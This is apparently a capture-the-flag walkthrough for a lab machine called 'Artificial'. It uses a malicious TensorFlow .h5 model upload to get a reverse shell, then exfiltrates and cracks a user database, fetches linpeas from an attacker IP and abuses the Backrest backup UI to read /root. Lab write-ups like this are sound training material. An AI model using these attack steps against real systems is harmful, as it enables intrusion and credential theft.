# Artificial - Easy

```sh
sudo vim /etc/hosts
# map IP to artificial.htb

nmap -T4 -p- -A -Pn -v artificial.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
    * 80/tcp - http - nginx 1.18.0

* the webpage on port 80 is for an AI company; the website has login and register functionality

* the webpage also contains example Python code on how to build a model - this creates a '.h5' model file

* web scan:

    ```sh
    gobuster dir -u http://artificial.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # basic dir scan

    ffuf -c -u "http://artificial.htb" -H "Host: FUZZ.artificial.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 154 -s
    # subdomain scan
    ```

* by creating a test account and logging in, we get the dashboard view where an upload option is provided

* the website allows to upload, manage and run AI models; it also provides 'requirements.txt' for required dependencies, and 'Dockerfile' for the env

* the requirement file lists a single dependency - ```tensorflow-cpu``` version 2.13.1

* checking the Dockerfile:

    ```dockerfile
    FROM python:3.8-slim

    WORKDIR /code

    RUN apt-get update && \
        apt-get install -y curl && \
        curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
        rm -rf /var/lib/apt/lists/*

    RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

    ENTRYPOINT ["/bin/bash"]
    ```

    * uses the Python 3.8 slim image
    * sets the working directory to '/code'
    * installs ```curl``` and ```tensorflow-cpu``` 2.13.1
    * sets default entrypoint; so that the container starts with a shell

* in the upload option, we can attempt to upload a normal PHP webshell to begin with, by intercepting requests in Burp Suite

* the webpage is expecting '.h5' files; we can select any file for uploading, but we do not get a success message or any indicators that the file has been uploaded

* the main webpage includes a JS script in source code at '/static/js/scripts.js' - this includes the upload logic:

    * a POST request to '/upload_model' endpoint is used to upload the model
    * the server should respond with an alert 'Model uploaded successfully!' if the file is uploaded

* Googling for exploits with '.h5' files and ```tensorflow``` leads to this [tensorflow RCE PoC blog](https://mastersplinter.work/research/tensorflow-rce/), which shows how models can lead to RCE

* we can use the [exploit repo](https://github.com/Splinter0/tensorflow-rce) to generate a malicious model - but we need to use the given requirements and Dockerfile:

    ```sh
    sudo apt install docker.io
    # install docker first

    # build the image using the given Dockerfile
    sudo docker build -t artificial .

    vim tensorflow-model-rce.py
    # edit the exploit code to include listener IP, port

    # run the container
    sudo docker run -it -v "$PWD":/code artificial
    # mounts the current directory
    # -it to drop into shell

    python tensorflow-model-rce.py
    # this compiles a model - it is saved to current directory, which is mounted in container

    exit
    ```

* now, we can upload the 'exploit.h5' file - this time the upload is accepted, and we can view the model

* we can run the model with the 'View Predictions' option or delete it - but before that we need to setup listener using ```nc -nvlp 4444``` to catch the reverse shell

* clicking on 'View Predictions' runs the model and gives us a reverse shell:

    ```sh
    id
    # 'app' user

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    pwd
    # /home/app/app

    ls -la
    # webapp code

    ls -la /home
    # we have another user 'gael'

    ls -la /home/gael
    # permission denied

    # enumerate webapp code
    cat app.py
    # this gives us a webapp secret key

    ls instance
    # we have 'users.db'
    # transfer this to attacker

    cd instance

    md5sum users.db
    # check hash

    cat users.db | base64 -w 0; echo
    # convert file to base64
    ```

    ```sh
    # on attacker
    echo -n "<base64-encoded-content>" | base64 -d > users.db

    md5sum users.db
    # verify hash
    ```

* the 'app.py' code gives us a secret key 'Sup3rS3cr3tKey4rtIfici4L', this is used as the DB secret

* also the source code shows that the passwords are hashes with MD5

* as we have a 'users.db' file as well, we can transfer it to attacker and check for hashes:

    ```sh
    sqlitebrowser users.db
    ```

* the DB file contains 5 usernames and password hashes - including 'gael' - we can crack these hashes:

    ```sh
    vim md5hashes
    # paste all hashes

    hashcat -m 0 md5hashes /usr/share/wordlists/rockyou.txt --force
    ```

* ```hashcat``` cracks the cleartext passwords and we have these creds - 'gael:mattp005numbertwo' and 'royer:marwinnarak043414036'

* we can attempt SSH login as 'gael' with these 2 passwords:

    ```sh
    ssh gael@artificial.htb
    # gael password works

    cat user.txt
    # user flag

    sudo -l
    # not allowed

    # fetch script and attempt basic enum using linpeas
    wget http://10.10.14.34:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box is running Linux version 5.4.0-216-generic, Ubuntu 20.04.6
    * there are services listening locally on ports 5000 & 9898
    * the webapp is using port 5000
    * there is a non-default directory ```/opt/backrest```

* checking the directory in ```/opt```:

    ```sh
    ls -la /opt/backrest
    # we have the 'backrest' binary and some more files

    cd /opt/backrest
    # enumerate these files

    cat .config/backrest/config.json
    # cannot read config file

    cat jwt-secret
    # permission denied

    cat install.sh
    # install script for backrest webui
    ```

* the install script shows that it is for [backrest WebUI](https://github.com/garethgeorge/backrest), and it is running on localhost 9898

* ```backrest``` is built on top of ```restic```, and acts as a wrapper for it

* checking for any existing backups by ```backrest```, we can check in ```/var/backups``` - this shows a '.gz' file

* we can try to move this to attacker and try to check if this backup log contains any secrets:

    ```sh
    # on attacker
    scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz .
    ```

* we can attempt to extract the files:

    ```sh
    gunzip backrest_backup.tar.gz
    # not in gzip format

    file backrest_backup.tar.gz
    # POSIX tar archive

    tar -xvf backrest_backup.tar.gz
    # this extracts the files in 'backrest' folder

    cd backrest

    ls -la
    # enumerate for secrets

    cat .config/backrest/config.json
    # this includes hash for 'backrest_root'
    ```

* the 'config.json' file includes a password hash for 'backrest_root' user

* checking the hash using online hash identifier tools, it shows up as a base64-encoded string

* decoding this hash from base64 gives us the actual password hash - using the hash identifier tool again shows that it is a bcrypt hash, supported by mode 3200 in ```hashcat```:

    ```sh
    vim bcrypthash
    # paste base64-decoded hash

    hashcat -m 3200 bcrypthash /usr/share/wordlists/rockyou.txt --force
    ```

* this cracks the password to give '!@#$%^'

* we can check ```backrest``` webui now, but first we need to do local port forwarding to access this:

    ```sh
    # on attacker
    ssh -L 1234:localhost:9898 gael@artificial.htb
    # -L for local port forwarding
    ```

* now we can access ```backrest``` on attacker by navigating to 'http://localhost:1234'

* this is running ```backrest``` version 1.7.2, and is prompting for login - we can use the cracked creds here

* in the dashboard view, there is no repo (where backups would be stored) or backup currently; we can refer the [backrest docs](https://garethgeorge.github.io/backrest/introduction/getting-started/) and [restic docs](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#preparing-a-new-repository) to create a repo by navigating to 'add repo'

* while creating repo, we can set the repository URI to ```/home/gael```, so that the backup is stored in gael's home directory

* once the repo is created, we can click on 'add plan' to create the backup plan config

* here, we can select the repo we just created, and submit the path as ```/root```, so that the files from this directory are backed up

* now if we click on the plan we just created, we have a 'Backup Now' option that can be selected, which triggers the backup process

* now, if we navigate to the home directory, we have a '.gz' file - we can check this further

* we can also check the files in the ```backrest``` web UI, by clicking on the backup timestamp, this leads to a 'Snapshot Browser' option - which shows the files

* we can see the root flag at ```/root/root.txt``` - but to download this, we can click on the root file > 'Restore to Path' - leave the fields as default and confirm restore

* once the restore is confirmed, the web UI provides an option to download the file directly, we can do that and we have the root flag now
